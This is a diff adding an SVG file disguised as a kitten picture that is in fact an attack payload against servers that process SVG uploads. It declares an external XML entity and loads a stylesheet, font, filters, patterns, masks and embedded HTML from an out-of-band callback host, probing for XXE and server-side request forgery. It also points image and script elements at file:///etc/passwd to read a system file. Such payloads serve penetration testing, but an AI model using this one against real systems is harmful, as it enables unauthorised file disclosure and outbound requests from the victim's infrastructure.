@@ -1,0 +1,79 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE svg [
+  <!ENTITY kitten SYSTEM "https://1priq5vlzb2iy0i98blwup8w6nce0d21r.oastify.com/200/200">
+]>
+
+<?xml-stylesheet type="text/css" href="https://1priq5vlzb2iy0i98blwup8w6nce0d21r.oastify.com/200/200"?>
+
+<svg xmlns="http://www.w3.org/2000/svg"
+     xmlns:xlink="http://www.w3.org/1999/xlink"
+     width="400" height="400">
+
+  <!-- Embedded CSS with external fetches -->
+  <style>
+    @font-face {
+      font-family: "KittenFont";
+      src: url("https://1priq5vlzb2iy0i98blwup8w6nce0d21r.oastify.com/200/200");
+    }
+
+    .bg {
+      fill: url("https://1priq5vlzb2iy0i98blwup8w6nce0d21r.oastify.com/200/200");
+    }
+  </style>
+
+  <!-- Direct image load -->
+  <image href="file:///etc/passwd"
+         x="0" y="0" width="100" height="100"/>
+
+  <!-- Filter using external image -->
+  <defs>
+    <filter id="kittenFilter">
+      <feImage href="https://1priq5vlzb2iy0i98blwup8w6nce0d21r.oastify.com/200/"/>      
+      <feImage href="https://1priq5vlzb2iy0i98blwup8w6nce0d21r.oastify.com/200/200" result="img"/>
+      <feBlend in="SourceGraphic" in2="img" mode="multiply"/>
+    </filter>
+  </defs>
+
+  <rect x="110" y="0" width="100" height="100" filter="url(#kittenFilter)"/>
+
+  <!-- Pattern referencing external image -->
+  <defs>
+    <pattern id="kittenPattern" patternUnits="userSpaceOnUse" width="100" height="100">
+      <image href="https://1priq5vlzb2iy0i98blwup8w6nce0d21r.oastify.com/200/image"
+             width="100" height="100"/>
+    </pattern>
+  </defs>
+
+  <rect x="0" y="110" width="100" height="100" fill="url(#kittenPattern)"/>
+
+  <!-- External <use> reference -->
+  <use href="https://1priq5vlzb2iy0i98blwup8w6nce0d21r.oastify.com/200/href#id"
+       x="110" y="110" width="100" height="100"/>
+
+  <!-- Script reference -->
+  <script href="file:///etc/passwd"></script>
+
+  <!-- Anchor (user-triggered request) -->
+  <a href="https://1priq5vlzb2iy0i98blwup8w6nce0d21r.oastify.com/200/a">
+    <text x="10" y="250" font-size="14">Click for kitten</text>
+  </a>
+
+  <!-- foreignObject embedding HTML -->
+  <foreignObject x="0" y="260" width="200" height="120">
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      <img src="https://1priq5vlzb2iy0i98blwup8w6nce0d21r.oastify.com/200/foreignObjectimage" width="100" height="100"/>
+    </body>
+  </foreignObject>
+
+  <!-- Mask referencing external image -->
+  <defs>
+    <mask id="kittenMask">
+      <image href="https://1priq5vlzb2iy0i98blwup8w6nce0d21r.oastify.com/200/imagede"
+             width="100" height="100"/>
+    </mask>
+  </defs>
+
+  <rect x="220" y="0" width="100" height="100" fill="black" mask="url(#kittenMask)"/>
+
+</svg>
